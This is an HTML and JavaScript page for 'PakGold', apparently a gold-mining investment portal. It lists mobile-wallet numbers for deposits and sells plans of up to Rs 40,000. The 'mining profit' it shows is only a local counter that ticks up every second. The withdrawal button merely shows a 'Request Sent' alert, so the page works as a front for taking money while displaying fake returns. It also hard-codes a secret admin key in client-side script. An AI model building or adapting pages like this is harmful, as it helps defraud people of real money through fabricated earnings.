<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Professional White Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --card: #ffffff; --text: #1e293b; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        
        body { background: var(--bg); color: var(--text); -webkit-tap-highlight-color: transparent; }

        .page { display: none; min-height: 100vh; padding-bottom: 90px; animation: fadeIn 0.4s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Header & Wallets */
        .header { background: white; padding: 40px 20px 25px; border-radius: 0 0 35px 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
        .balance-row { display: flex; gap: 12px; margin-top: 20px; }
        .card { flex: 1; background: var(--card); padding: 15px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #f1f5f9; }
        .card small { font-size: 0.6rem; color: #94a3b8; font-weight: 800; text-transform: uppercase; }
        .card b { display: block; font-size: 1.1rem; color: var(--gold-dark); margin-top: 5px; }

        /* Modern Grid */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 20px; }
        .p-card { background: white; padding: 20px; border-radius: 25px; text-align: center; border: 1px solid #edf2f7; transition: 0.2s; }
        .p-card:active { transform: scale(0.96); }
        .p-icon { font-size: 2.2rem; margin-bottom: 10px; display: block; }
        .timer { font-size: 0.6rem; background: #fff9e6; color: var(--gold-dark); padding: 3px 8px; border-radius: 50px; font-weight: 700; }

        /* Forms */
        .form-area { background: white; margin: 20px; padding: 25px; border-radius: 25px; box-shadow: 0 10px 40px rgba(0,0,0,0.04); }
        input, select { width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; border: 1px solid #e2e8f0; background: #fdfdfd; outline: none; font-size: 0.9rem; }
        .btn { background: var(--gold-dark); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; box-shadow: 0 5px 15px rgba(184, 134, 11, 0.2); }

        /* Floating Nav */
        .nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; border-radius: 25px 25px 0 0; }
        .nav-link { text-align: center; font-size: 0.7rem; color: #cbd5e1; cursor: pointer; text-decoration: none; }
        .nav-link.active { color: var(--gold-dark); font-weight: 800; }

        /* Hidden Admin Style */
        #admin-panel { background: #fff; padding: 20px; margin: 20px; border-radius: 20px; border: 2px dashed var(--gold); }
    </style>
</head>
<body onload="checkStatus()">

    <!-- LOGIN / SECRET ADMIN GATE -->
    <section id="login" class="page active">
        <div style="padding: 100px 30px; text-align: center;">
            <h1 style="font-size: 3rem;">⚜️</h1>
            <h2 style="margin: 15px 0 30px;">Member Portal</h2>
            <div class="form-area">
                <input type="text" id="phone-input" placeholder="Phone Number">
                <input type="password" id="admin-key" placeholder="Security Key (Optional)">
                <button class="btn" onclick="handleLogin()">Login Sweetie 💋</button>
            </div>
            <p style="font-size:0.7rem; opacity:0.4;">Authorized Access Only</p>
        </div>
    </section>

    <!-- HOME PAGE -->
    <section id="home" class="page">
        <div class="header">
            <h3 style="letter-spacing:1px;">PAK GOLD ⚜️</h3>
            <div class="balance-row">
                <div class="card">
                    <small>Wallet Balance</small>
                    <b id="w-bal">Rs 0</b>
                </div>
                <div class="card">
                    <small>Mining Profit</small>
                    <b id="p-bal">Rs 0.0000</b>
                </div>
            </div>
            <div id="status-chip" style="margin-top:15px; font-size:0.6rem; color:#94a3b8; font-weight:bold;">SYSTEM INACTIVE</div>
        </div>
        <div class="grid" id="plans-container"></div>
    </section>

    <!-- DEPOSIT PAGE -->
    <section id="deposit" class="page">
        <div class="header"><h3>Add Funds</h3></div>
        <div class="form-area">
            <p style="font-size:0.8rem; margin-bottom:10px;"><b>JazzCash/SadaPay:</b> 03705519562<br><b>EasyPaisa:</b> 03379827882</p>
            <select id="dep-method">
                <option>JazzCash</option>
                <option>EasyPaisa</option>
                <option>SadaPay</option>
            </select>
            <input type="number" id="dep-amt" placeholder="Amount (Min 500)">
            <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
            <label style="font-size:0.7rem; display:block; margin:10px 0 5px;">Upload Screenshot Proof:</label>
            <input type="file" id="dep-proof" accept="image/*" style="font-size:0.7rem;">
            <button class="btn" onclick="submitDeposit()">Submit Deposit</button>
        </div>
    </section>

    <!-- WITHDRAW PAGE -->
    <section id="withdraw" class="page">
        <div class="header"><h3>Withdrawal</h3></div>
        <div class="form-area">
            <select id="wit-method">
                <option>JazzCash</option>
                <option>EasyPaisa</option>
                <option>Bank Transfer</option>
                <option>Binance (USDT)</option>
            </select>
            <input type="number" placeholder="Enter Amount">
            <input type="text" placeholder="Account Number">
            <input type="text" placeholder="Account Name">
            <button class="btn" style="background:#1e293b" onclick="alert('Withdrawal Request Sent!')">Request Payout</button>
        </div>
    </section>

    <!-- SECRET ADMIN PAGE -->
    <section id="admin" class="page">
        <div class="header"><h3>Administration 🔑</h3></div>
        <div id="admin-panel">
            <h4>Pending Approvals</h4>
            <div id="logs" style="font-size:0.75rem; margin-top:10px;">No requests found.</div>
        </div>
    </section>

    <!-- FOOTER NAV -->
    <nav class="nav" id="bottom-nav" style="display:none;">
        <div class="nav-link active" onclick="nav('home')">🏠<br>Home</div>
        <div class="nav-link" onclick="nav('deposit')">💰<br>Deposit</div>
        <div class="nav-link" onclick="nav('withdraw')">💸<br>Withdraw</div>
    </nav>

    <script>
        const plans = [
            {n:"Nano", p:500, s:0.0004, i:"🌱"}, {n:"Silver", p:1000, s:0.0009, i:"🥈"},
            {n:"Gold", p:3000, s:0.0035, i:"🥇"}, {n:"Ruby", p:7000, s:0.0090, i:"💎"},
            {n:"Elite", p:15000, s:0.0220, i:"👑"}, {n:"Imperial", p:40000, s:0.0650, i:"🏰"}
        ];

        function checkStatus() {
            if(localStorage.getItem('isUser')) {
                nav('home');
                startMining();
            }
            renderPlans();
        }

        function handleLogin() {
            let ph = document.getElementById('phone-input').value;
            let key = document.getElementById('admin-key').value;

            // SECRET ADMIN KEY: "pakgold786" (Aap ise change kar sakti hain)
            if(key === "pakgold786") {
                localStorage.setItem('isAdmin', 'true');
                nav('admin');
                return;
            }

            if(ph.length < 10) return alert("Valid number please! 💋");
            localStorage.setItem('isUser', 'true');
            if(!localStorage.getItem('wal')) {
                localStorage.setItem('wal', 0);
                localStorage.setItem('pro', 0.0);
                localStorage.setItem('active', 'none');
            }
            location.reload();
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('bottom-nav').style.display = (id === 'login' || id === 'admin') ? 'none' : 'flex';
        }

        function renderPlans() {
            let cont = document.getElementById('plans-container');
            plans.forEach(p => {
                cont.innerHTML += `
                <div class="p-card" onclick="buyPlan(${p.p}, ${p.s}, '${p.n}')">
                    <span class="p-icon">${p.i}</span>
                    <h4 style="font-size:0.9rem;">${p.n}</h4>
                    <b style="color:var(--gold-dark); font-size:0.8rem;">Rs ${p.p}</b><br>
                    <span class="timer">24h Cycle</span>
                </div>`;
            });
        }

        function submitDeposit() {
            let tid = document.getElementById('dep-tid').value;
            let amt = document.getElementById('dep-amt').value;
            if(!tid || amt < 500) return alert("Sahi info dalo sweetie! 💋");
            
            let data = JSON.parse(localStorage.getItem('admin_data') || '[]');
            data.push({type: 'Deposit', amount: amt, info: tid, time: new Date().toLocaleString()});
            localStorage.setItem('admin_data', JSON.stringify(data));
            
            alert("Payment Proof Submitted! 💋");
            nav('home');
        }

        function buyPlan(price, speed, name) {
            let wal = parseInt(localStorage.getItem('wal'));
            if(wal < price) return alert("Deposit first, sweetie! 💋");
            
            localStorage.setItem('wal', wal - price);
            localStorage.setItem('active', name);
            localStorage.setItem('speed', speed);
            location.reload();
        }

        function startMining() {
            document.getElementById('w-bal').innerText = "Rs " + localStorage.getItem('wal');
            let active = localStorage.getItem('active');
            if(active !== 'none') {
                document.getElementById('status-chip').innerText = "ACTIVE MINING: " + active;
                document.getElementById('status-chip').style.color = "#22c55e";
                setInterval(() => {
                    let cur = parseFloat(localStorage.getItem('pro')) + parseFloat(localStorage.getItem('speed'));
                    localStorage.setItem('pro', cur.toFixed(4));
                    document.getElementById('p-bal').innerText = "Rs " + cur.toFixed(4);
                }, 1000);
            }
        }
    </script>
</body>
</html>
